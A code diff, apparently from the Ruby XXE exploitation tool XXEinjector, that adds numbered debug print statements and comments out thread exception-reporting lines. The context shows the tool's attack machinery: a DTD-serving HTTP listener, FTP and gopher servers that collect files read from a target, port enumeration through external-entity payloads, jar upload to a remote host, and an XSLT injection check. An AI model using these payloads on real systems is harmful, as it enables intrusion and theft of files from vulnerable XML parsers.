@@ -735,14 +735,20 @@ rescue Errno::EADDRINUSE
 	exit(1)
 end
 
+puts "222"
 # HTTP for XML serving and data retrival
 Thread.start do
-Thread.current.report_on_exception = false
+puts "111"
+#Thread.current.report_on_exception = false
+puts "333"
 loop do
   Thread.start(http.accept) do |client|
-	Thread.current.report_on_exception = false
+    puts "878787"
+	#Thread.current.report_on_exception = false
+    puts "9999"
 	$done = 0
 	$tmppath = $nextpath
+    puts "444"
 	loop {
 
 		params = {}
@@ -750,8 +756,10 @@ loop do
 		break if req.nil?
 
 		# HTTP XML serving
+        puts "555"
 		if req.include? "file.dtd"
 
+            puts "666"
 			puts "[+] Got request for XML:\n#{req}\n" if $verbose == "y"
 
 			if hashes == "n" && upload == "" && expect == ""
@@ -863,10 +871,10 @@ end
 # FTP server to read files/directory listings and log to files
 if enum == "ftp"
 	Thread.start do
-	Thread.current.report_on_exception = false
+	#Thread.current.report_on_exception = false
 	loop do
   	  Thread.start(ftp.accept) do |client|
-		Thread.current.report_on_exception = false
+		#Thread.current.report_on_exception = false
 		$done = 0
 		switch = 0
 		#puts "Response with file/directory content received. Enumeration unlocked." if $verbose == "y"
@@ -934,10 +942,10 @@ end
 # gopher server to read files/directory listings and log to files
 if enum == "gopher"
 	Thread.start do
-	Thread.current.report_on_exception = false
+	#Thread.current.report_on_exception = false
 	loop do
  	  Thread.start(gopher.accept) do |client|
-		Thread.current.report_on_exception = false
+		#Thread.current.report_on_exception = false
 		$done = 0
 		switch = 0
 		#puts "Response with file/directory content received. Enumeration unlocked." if $verbose == "y"
@@ -994,11 +1002,11 @@ if enumports != ""
 			$dtd = "<!DOCTYPE convert [ <!ENTITY % remote SYSTEM \"http://#{host}:#{j}/success.dtd\">%remote;]>"
 			begin
 				Thread.start do
-				Thread.current.report_on_exception = false
+				#Thread.current.report_on_exception = false
 				loop do
 				  enum = TCPServer.new j
   				  Thread.start(enum.accept) do |client|
-					Thread.current.report_on_exception = false
+					#Thread.current.report_on_exception = false
 					ports += String(j) + ","
 					client.close
 					break
@@ -1021,11 +1029,11 @@ if enumports != ""
 			$dtd = "<!DOCTYPE convert [ <!ENTITY % remote SYSTEM \"http://#{host}:#{tcpport}/success.dtd\">%remote;]>"
 			begin
 				Thread.start do
-				Thread.current.report_on_exception = false
+				#Thread.current.report_on_exception = false
 				loop do
 				  enum = TCPServer.new tcpport
   				  Thread.start(enum.accept) do |client|
-					Thread.current.report_on_exception = false
+					#Thread.current.report_on_exception = false
 					ports += String(tcpport) + ","
 					client.close
 					break
@@ -1055,10 +1063,10 @@ end
 # TCP server for uploading files using Java jar
 if upload != ""
 	Thread.start do
-	Thread.current.report_on_exception = false
+	#Thread.current.report_on_exception = false
 	loop do
   	  Thread.start(jar.accept) do |client|
-		Thread.current.report_on_exception = false
+		#Thread.current.report_on_exception = false
 		content = IO.binread(upload)
 		count = 0
 		puts "[+] File uploaded. Check temp directory on remote host for jar_cache*.tmp file. This file is available until connection is closed."
@@ -1082,10 +1090,10 @@ end
 if $xslt == "y"
 	test = 0
 	Thread.start do
-	Thread.current.report_on_exception = false
+	#Thread.current.report_on_exception = false
 	loop do
   	  Thread.start(xsltserv.accept) do |client|
-		Thread.current.report_on_exception = false
+		#Thread.current.report_on_exception = false
 		puts "[+] XSLT injection is working!"
 		client.close
 		exit(1)
